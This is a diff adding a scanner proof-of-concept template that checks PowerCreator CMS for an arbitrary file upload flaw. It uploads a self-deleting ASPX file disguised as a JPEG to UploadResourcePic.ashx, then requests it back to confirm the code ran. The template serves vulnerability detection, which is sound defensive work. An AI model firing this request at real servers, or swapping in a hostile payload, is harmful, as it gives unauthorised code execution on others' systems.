@@ -1,0 +1,35 @@
+name: poc-yaml-PowerCreatorCMS-UploadResourcePic-File-upload
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /upload/UploadResourcePic.ashx?ResourceID=8382
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+      body: "\
+        -----------------------------20873900192357278038549710136\r\n\
+        Content-Disposition: form-data; name=\"file1\"; filename=\"qaz.aspx\"\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <%@Page Language=\"C#\"%><%Response.Write(\"pboyjnnrfipmplsukdeczudsefxmywe\");System.IO.File.Delete(Request.PhysicalPath);%>\r\n\
+        -----------------------------20873900192357278038549710136--\r\n\
+        "
+    expression: response.status == 200 
+
+  r1:
+    request:
+      method: GET
+      path: /ResourcePic/ODM4Mg==.ASPX
+    expression: response.status == 200 && response.body.bcontains(b'pboyjnnrfipmplsukdeczudsefxmywe')
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140487417
